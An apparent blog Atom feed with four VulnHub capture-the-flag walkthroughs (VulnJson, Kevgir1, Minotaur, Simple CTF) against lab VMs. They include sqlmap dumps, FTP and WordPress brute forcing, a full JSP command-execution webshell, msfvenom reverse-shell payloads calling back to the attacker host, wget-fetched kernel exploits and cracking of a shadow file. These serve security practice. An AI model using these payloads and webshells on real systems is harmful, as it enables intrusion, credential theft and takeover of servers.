<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-05-19T16:03:22-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Csharp: VulnJson]]></title>
    <link href="http://wg135.github.io/blog/2016/05/05/csharp-vulnjson/"/>
    <updated>2016-05-05T15:44:32-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/05/csharp-vulnjson</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Burp</li>
<li>Sqlmap</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.175 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.175 -p-</code></p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.175/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/vulnjson/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like /bin is a hidden path. Lets check it.</p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Sqlmap tips</p>

<p>from <a href="https://vimeo.com/96799028">Marudhamaran Gunasekaran</a></p>

<pre><code>How do I test a log in protected website with sqlmap?
use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
How do I test a website with sqlmap that requires authentication?
use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
How do I test a website with sqlmap that uses JSON data?
automatically works with JSON
How do I test a website with sqlmap that uses XML data?
use the custom injection paramter pointer *
How do I test a website with sqlmap that uses SSL?
use the --force-ssl parameter
How do I tell sqlmap to try harder?
use the --level and --risk parameters
How do I automate a sql map scan?
use the --batch and --crawl 3
</code></pre>

<p>go to the <a href="http://192.168.79.175,">http://192.168.79.175,</a> then search the users and use burp to record the traffic.</p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Then click the traffic content in the burp and right click it and copy to file, name it as test.txt.</p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>Then in the terminal, we try:</p>

<pre><code>sqlmap -r test.txt  --level 5 --risk 3 --threads 10 -p "username" --dump
</code></pre>

<p>since there is a parameter username in the post request, so we use that as a parameter for sqlmap</p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now the sqlmap dump all items I created.</p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulhub:kevgir1]]></title>
    <link href="http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1/"/>
    <updated>2016-05-02T14:42:52-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kevgir-1,137/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>hydra</li>
<li>msfvenom</li>
<li>joomscan</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.174 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.174 -p-</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Let attack ftp now.</p>

<p><code>hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt  -u  -s 25 192.168.79.174 ftp</code></p>

<p>get the user name and password</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>try ssh using same username and password</p>

<p><code>ssh -p 1322 admin@192.168.79.174</code></p>

<p>FTP attack DONE</p>

<p>Now it is privilege escalation time</p>

<p><code>uname -a</code>, get the result:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit 14.04</code>
<img src="/images/blog/vulhub/kevgir1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>try <code>/linux/local/37292.c</code>, copy it to /var/www/html/, use wget to download to target machine, then compile it.</p>

<p><code>gcc 37292.c -o attack -static</code>, then run <code>attack</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>failed, now try harder.</p>

<p>In the searchsploit result, there is a 39166.c. Lets try this one.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>GET the ROOT!!</p>

<p>Now let&rsquo;s attack port 8080. Use nikto to scan it first.</p>

<p><code>nikto -h 192.168.79.174:8080</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>We got the username and password for tomcat manager &hellip; good</p>

<p>log into the manager page and now we can upload webshell&hellip;.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>create webshell(from pentester lab, you may generate it using msfvenom)</p>

<p>```php index.jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
&lt;%@ page import=&ldquo;java.io.*&rdquo; %>
&lt;%
   String cmd = request.getParameter(&ldquo;cmd&rdquo;);
   String output = &ldquo;&rdquo;;
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+&ldquo;</br>&rdquo;; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%></p>

<pre><%=output %></pre>


<pre><code>
now pack the webshell
</code></pre>

<p>mkdir webshell
cp index.jsp webshell</p>

<p>cd webshell
jar -cvf ../webshell.war *</p>

<p>```</p>

<p>now upload the webshell.war. After uploading, visit page  <code>192.168.79.174:8080/webshell/</code>.</p>

<p>get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Lets use msfvenom to create webshell</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.173 LPORT=4444 -f war &gt; webshell1.war</code></p>

<p>upload webshell1.war and setup netcat listening on port 4444. After connection is setup. do <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE for Tomcat</p>

<p>Now move to port 8081</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>Its Joomla!.</p>

<p>use tool <code>joomscan</code> to scan it</p>

<p><code>joomscan -u http://192.168.79.174:8081</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>get the version of joomla!</p>

<p>Now find out the vulnerability:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>follow the instructions of this vulnerability.</p>

<p>login as admin:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>create php reverse shell:</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.173 LPORT=6666 -e php/base64 -f raw &gt; shell.php</code></p>

<p>In Extension ->Template Manager, edit existing template. Copy the content of the shell.php to it and don&rsquo;t forgot to add &lt;?php and ?>.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>set up the netcat and preview the page. get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>now lets try another php webshell</p>

<p><a href="https://github.com/wg135/webshell-1/blob/master/php/reverseshell-poc.txt">reverse shell from hacksys team</a></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kevgir1/gameover.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SecTalks: BNE0x00 - Minotaur]]></title>
    <link href="http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur/"/>
    <updated>2016-04-26T13:27:14-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/">Vulhub</a></p>

<h3>Forces:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>WPscan</li>
<li>msfvenom</li>
<li>John the Ripper</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.56.223 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.56.223 -p-</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22, 80 and 2020 are opening.</p>

<p>use wfuzz to find more locations</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.223/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>found <a href="http://192.168.56.223/bull/">http://192.168.56.223/bull/</a></p>

<p>Check the page, looks like it uses wordpress. Good. maybe I can find out some outdated wordpress plugins.</p>

<p><img src="/images/blog/vulhub/bne03/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I use wpscan to find wordpress plugins vulnerabilities.</p>

<p><code>uby wpscan.rb --url http://192.168.56.223/bull/</code></p>

<p>get some xss vulnerabilities and an interestig arbutrart file upload vulnerability.</p>

<p><img src="/images/blog/vulhub/bne03/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>next step, user enumeration.</p>

<p><code>ruby wpscan.rb --url http://192.168.56.223/bull/ --enumerate u</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get a user name <code>bully</code></p>

<p>next step, password guessing:</p>

<p><code>ruby wpscan.rb --url http://192.168.56.223/bull/ --wordlist SecLists/Passwords/passwords_john.txt threads 50</code></p>

<p>no luck this time. Let&rsquo;s try harder..</p>

<p>we use cewl this time to generate password file</p>

<p><code>cewl -w password.txt http://192.168.56.223/bull/</code></p>

<p>also john the ripper should be used to mutate the password file:</p>

<p><code>john --wordlist=password.txt --rules --stdout &gt; out.txt</code></p>

<p>now I use wpscan to brute force the password:</p>

<p><code>wpscan --url 192.168.56.223/bull --wordlist out.txt --username bully</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now, create php reverse shell:</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.223 -a php --platform php -o evil.php</code></p>

<p>based one wpscan scan result, the wordpress slideshow gallery shell upload exploit(<a href="https://www.exploit-db.com/exploits/34681/">https://www.exploit-db.com/exploits/34681/</a>) is found. Save it as <code>wp_gallery.py</code></p>

<p>run:</p>

<p><code>python wp_gallery.py -t http://192.168.56.223/bull -u bully -p Bighornedbulls -f evil.php</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>set netcat
<code>nc -nlvp 1234</code></p>

<p>visit <code>http://192.168.56.223/bull/wp-content/uploads/slideshow-gallery/evil.php</code></p>

<p>get the meterpreter</p>

<p><img src="/images/blog/vulhub/bne03/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>locate flag.txt and get the result <code>/tmp/flag.txt</code></p>

<p>find a file shadow.bak in /tmp, I got some interesting things:</p>

<p><img src="/images/blog/vulhub/bne03/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like there are more chances to me. Download this file and use john to crack more.</p>

<p><code>john --fork=4 shadow.bak</code></p>

<p>now I have two more accounts info</p>

<p><img src="/images/blog/vulhub/bne03/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>use python <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>Login as heffer:</p>

<p><img src="/images/blog/vulhub/bne03/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Login as minotaur:</p>

<p><img src="/images/blog/vulhub/bne03/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SecTalks: BNE0x03 - Simple]]></title>
    <link href="http://wg135.github.io/blog/2016/04/20/sectalks-bne0x03-simple/"/>
    <updated>2016-04-20T13:49:22-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/20/sectalks-bne0x03-simple</id>
    <content type="html"><![CDATA[<p><em>May the LORD, my rock, be praised, who trains my hands for battle and my fingers for warfare.</em> &mdash;- Psalm 144:1</p>

<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">Vulhub</a>
Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don&rsquo;t have physical access to this machine. Therefore, tricks like editing the VM&rsquo;s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Burp Suite</li>
<li>Metasploit</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Search the web app vulnerability  &mdash; searchsploit</li>
<li>Generate and upload webshell  &mdash;metasploit</li>
<li>Get root</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.172 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.172 -p-</code></p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening. Lets use Iceweasel to view the page.</p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>I noticed that the web app is Cutenews 2.0.3. search the exploit:</p>

<p><code>searchsploit cutenews</code></p>

<p>find the interesting results:</p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>The exploit is as follow:</p>

<ul>
<li>Sign up for New User</li>
<li>Log In</li>
<li>Go to Personal options <a href="http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal">http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal</a></li>
<li>Select Upload Avatar Example: Evil.jpg</li>
<li>use tamper data  &amp; Rename File Evil.jpg to Evil.php</li>
</ul>


<p>Okay, firstly, I creat a reverse php shell,</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.156 LPORT=1234 -a php --platform php -o evil.jpg</code></p>

<p>Now, use Burp as proxy, go to Personal options <a href="http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal">http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal</a> to upload evil.jpg</p>

<p>in the burp, change the evil.jgp to evil.php</p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>After that, Burp will recevied a GET request:</p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>set metasploit multi/handler.</p>

<p>now go to <a href="http://192.168.79.172/uploads/avatar_bob1bob2.php">http://192.168.79.172/uploads/avatar_bob1bob2.php</a> will get meterpreter reverse shell:</p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>However, I am not the root, search the os version:</p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>search the ubuntu 14.04</p>

<p><code>searchsploit ubuntu 14.04</code> and we get the result:</p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Move the file to /var/www/html/ and in reverse shell:</p>

<p><code>wget http://192.168.79.156/37292.c -O hack.c</code></p>

<p>compile it:</p>

<p><code>gcc hack.c -o hack -static</code>, run it.</p>

<p>then use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> to get the shell.</p>

<p><img src="/images/blog/vulhub/simple_ctf1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/simple_ctf1/last.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
